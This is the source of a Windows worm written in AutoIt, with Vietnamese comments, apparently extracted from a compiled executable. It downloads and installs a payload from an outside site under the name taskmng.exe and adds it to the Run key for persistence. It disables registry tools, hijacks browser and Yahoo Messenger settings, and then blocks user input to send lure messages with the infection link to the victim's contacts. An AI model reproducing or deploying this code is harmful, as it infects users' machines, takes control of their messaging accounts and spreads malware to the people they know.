; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: E:\hacker tool\virus.au3>
; ----------------------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://gotoforum.com"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\taskmng.exe") Then
InetGet ($website & "/sysrem.exe", @WindowsDir & "\taskmng.exe", 0, 1)
Sleep(5000)
EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "0")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmng.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Window Title", "REG_SZ", "http://hotads.netfirms.com")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[10]
$tin[0] = "This is my new Picture. :P " & $website & " "
$tin[1] = "Beauty Nude pics. ;) " & $website & " "
$tin[2] = "Britney Spear is in nude. :D " & $website & " "
$tin[3] = "I think, you are interested in this infomation. ;) " & $website & " "
$tin[4] = "Nothing is free, me too. :) " & $website & " "
$tin[5] = "Total is good for you. ;) " & $website & " "
$tin[6] = "Careful! Virus warning, how to clean it. x-( " & $website & " "
$tin[7] = "New speacial Paris Hilton video. :D " & $website & " "
$tin[8] = "Youtube bed room star, show her solo action. ;) " & $website & " "
$tin[9] = "Bin Laden is still alive. x-( " & $website & " "

; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(60000)
$tieude = WinGetTitle("Yahoo! Messenger", "")
$kiemtra = WinExists ($tieude)
If $kiemtra = 1 Then
$ngaunhien = Random(0,9,1)
ClipPut($tin[$ngaunhien])
BlockInput (1)
WinActivate($tieude)
Send("!m")
Send("un")
Send("^v {ENTER}{ENTER}")
Send("^m")
Send("{DOWN}")
Send("^{SHIFTDOWN}{END}{SHIFTUP}")
Send("{ENTER}")
Send("^v {ENTER}")
BlockInput (0)
EndIf
Sleep(1800000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: E:\hacker tool\virus.au3>
; ----------------------------------------------------------------------------

